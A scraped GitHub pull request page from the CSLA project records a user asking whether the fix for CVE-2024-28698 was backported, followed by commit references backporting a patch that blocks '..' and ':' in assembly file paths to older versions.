| [@rockfordlhotka](https://github.com/rockfordlhotka) I just got an email b/c one of my repo's is apparently using a version of Csla which is vunerable.  <https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-28698>  Was this fix ever backported? It seems like it should be given the effort required to move to Csla 6+.  [#4133](https://github.com/MarimerLLC/csla/issues/4133) |
| --- |

All reactions

Sorry, something went wrong.

[MaceySoftware](/MaceySoftware)
added a commit
to MaceySoftware/csla
that referenced
this pull request
[Aug 6, 2024](#ref-commit-07e7b8f)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[MarimerLLC#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MaceySoftware/csla/commit/07e7b8f82ad0474d5612f27f2d984cc9019a81e6 "#4133 Backfit of : Prevent use of .. or : in file path #3552") [Mari‚Ä¶](https://github.com/MarimerLLC/csla/pull/3552)`
‚Ä¶

`[07e7b8f](/MaceySoftware/csla/commit/07e7b8f82ad0474d5612f27f2d984cc9019a81e6)`

```
[‚Ä¶merLLC#3552](https://github.com/MarimerLLC/csla/pull/3552)
```

[MaceySoftware](/MaceySoftware)
added a commit
to MaceySoftware/csla
that referenced
this pull request
[Aug 6, 2024](#ref-commit-7e453f4)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[MarimerLLC#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MaceySoftware/csla/commit/7e453f45108137e77d1a5a5ef807446c8d098d80 "#4133 Backfit of : Prevent use of .. or : in file path #3552") [Mari‚Ä¶](https://github.com/MarimerLLC/csla/pull/3552)`
‚Ä¶

`[7e453f4](/MaceySoftware/csla/commit/7e453f45108137e77d1a5a5ef807446c8d098d80)`

```
[‚Ä¶merLLC#3552](https://github.com/MarimerLLC/csla/pull/3552)
```

[rockfordlhotka](/rockfordlhotka)
pushed a commit
that referenced
this pull request
[Aug 6, 2024](#ref-commit-445bc60)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MarimerLLC/csla/commit/445bc609bc117f62cabf49e1462f7a43b0f8f9a2 "#4133 Backfit of : Prevent use of .. or : in file path #3552 (#4138)") [#3552](https://github.com/MarimerLLC/csla/pull/3552) [(](/MarimerLLC/csla/commit/445bc609bc117f62cabf49e1462f7a43b0f8f9a2 "#4133 Backfit of : Prevent use of .. or : in file path #3552 (#4138)")[#4138](https://github.com/MarimerLLC/csla/pull/4138)[)](/MarimerLLC/csla/commit/445bc609bc117f62cabf49e1462f7a43b0f8f9a2 "#4133 Backfit of : Prevent use of .. or : in file path #3552 (#4138)")`

`[445bc60](/MarimerLLC/csla/commit/445bc609bc117f62cabf49e1462f7a43b0f8f9a2)`

[MaceySoftware](/MaceySoftware)
added a commit
to MaceySoftware/csla
that referenced
this pull request
[Aug 6, 2024](#ref-commit-85d8c6f)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[MarimerLLC#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MaceySoftware/csla/commit/85d8c6fa8fdafc9b9e31fd5b007515cf49024b01 "#4133 Backfit of : Prevent use of .. or : in file path #3552") [Mari‚Ä¶](https://github.com/MarimerLLC/csla/pull/3552)`
‚Ä¶

`[85d8c6f](/MaceySoftware/csla/commit/85d8c6fa8fdafc9b9e31fd5b007515cf49024b01)`

```
[‚Ä¶merLLC#3552](https://github.com/MarimerLLC/csla/pull/3552)
```

[MaceySoftware](/MaceySoftware)
added a commit
to MaceySoftware/csla
that referenced
this pull request
[Aug 6, 2024](#ref-commit-1007958)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[MarimerLLC#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MaceySoftware/csla/commit/100795813cd952e67ad1b5d042d75b865c71a24e "#4133 Backfit of : Prevent use of .. or : in file path #3552 for v6.x") [Mari‚Ä¶](https://github.com/MarimerLLC/csla/pull/3552)`
‚Ä¶

`[1007958](/MaceySoftware/csla/commit/100795813cd952e67ad1b5d042d75b865c71a24e)`

```
[‚Ä¶merLLC#3552](https://github.com/MarimerLLC/csla/pull/3552) for v6.x
```

[rockfordlhotka](/rockfordlhotka)
pushed a commit
that referenced
this pull request
[Aug 6, 2024](#ref-commit-8fbdd8c)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MarimerLLC/csla/commit/8fbdd8c773bfeb9ba3e52d91b5a664848629b13a "#4133 Backfit of : Prevent use of .. or : in file path #3552 for v6.x (#4145)") [#3552](https://github.com/MarimerLLC/csla/pull/3552) [for v6.x (](/MarimerLLC/csla/commit/8fbdd8c773bfeb9ba3e52d91b5a664848629b13a "#4133 Backfit of : Prevent use of .. or : in file path #3552 for v6.x (#4145)")[‚Ä¶](https://github.com/MarimerLLC/csla/pull/4145)`
‚Ä¶

`[8fbdd8c](/MarimerLLC/csla/commit/8fbdd8c773bfeb9ba3e52d91b5a664848629b13a)`

```
[‚Ä¶#4145](https://github.com/MarimerLLC/csla/pull/4145))
```

[rockfordlhotka](/rockfordlhotka)
pushed a commit
that referenced
this pull request
[Aug 6, 2024](#ref-commit-f3a5c34)
[![@MaceySoftware](https://avatars.githubusercontent.com/u/12074007?s=40&v=4)](/MaceySoftware)

`[#4133](https://github.com/MarimerLLC/csla/issues/4133) [Backfit of : Prevent use of .. or : in file path](/MarimerLLC/csla/commit/f3a5c3474974f60ce3c8ffbd5d91c23a1e397ea4 "#4133 Backfit of : Prevent use of .. or : in file path #3552 (#4144)") [#3552](https://github.com/MarimerLLC/csla/pull/3552) [(](/MarimerLLC/csla/commit/f3a5c3474974f60ce3c8ffbd5d91c23a1e397ea4 "#4133 Backfit of : Prevent use of .. or : in file path #3552 (#4144)")[#4144](https://github.com/MarimerLLC/csla/pull/4144)[)](/MarimerLLC/csla/commit/f3a5c3474974f60ce3c8ffbd5d91c23a1e397ea4 "#4133 Backfit of : Prevent use of .. or : in file path #3552 (#4144)")`

`[f3a5c34](/MarimerLLC/csla/commit/f3a5c3474974f60ce3c8ffbd5d91c23a1e397ea4)`

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FMarimerLLC%2Fcsla%2Fpull%2F3552)

Reviewers

[![@BaHXeLiSiHg](https://avatars.githubusercontent.com/u/15612158?s=40&v=4)](/BaHXeLiSiHg) [BaHXeLiSiHg](/BaHXeLiSiHg)

BaHXeLiSiHg left review comments

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

 [Prevent the use of ../ when loading assemblies](https://github.com/MarimerLLC/csla/issues/3551)

4 participants

[![@rockfordlhotka](https://avatars.githubusercontent.com/u/2333134?s=52&v=4)](/rockfordlhotka) [![@sampizzey](https://avatars.githubusercontent.com/u/119413670?s=52&v=4)](/sampizzey) [![@ajohnstone-ks](https://avatars.githubusercontent.com/u/22680122?s=52&v=4)](/ajohnstone-ks) [![@BaHXeLiSiHg](https://avatars.githubusercontent.com/u/15612158?s=52&v=4)](/BaHXeLiSiHg)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


